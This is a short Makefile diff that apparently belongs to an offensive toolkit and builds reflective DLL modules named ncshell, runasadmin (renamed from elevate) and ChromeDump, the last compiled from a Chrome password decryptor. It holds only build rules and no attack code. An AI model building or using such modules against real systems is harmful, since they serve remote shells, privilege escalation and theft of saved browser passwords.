@@ -29,9 +29,9 @@ ncshell:
 	$(COMPILER) ncshell.c ReflectiveLoader.c -c -m32
 	$(COMPILER) ncshell.o ReflectiveLoader.o -o ncshell.dll -shared -m32 -static -lws2_32
 
-elevate:
-	$(COMPILER) elevate.c ReflectiveLoader.c -c -m32
-	$(COMPILER) elevate.c ReflectiveLoader.o -o elevate.dll -shared -m32 -static	
+runasadmin:
+	$(COMPILER) runasadmin.c ReflectiveLoader.c -c -m32
+	$(COMPILER) runasadmin.c ReflectiveLoader.o -o runasadmin.dll -shared -m32 -static	
 
 ChromeDump:
 	$(COMPILER) ChromePassDecryptor.c ReflectiveLoader.c sqlite/sqlite3.c -c -m32
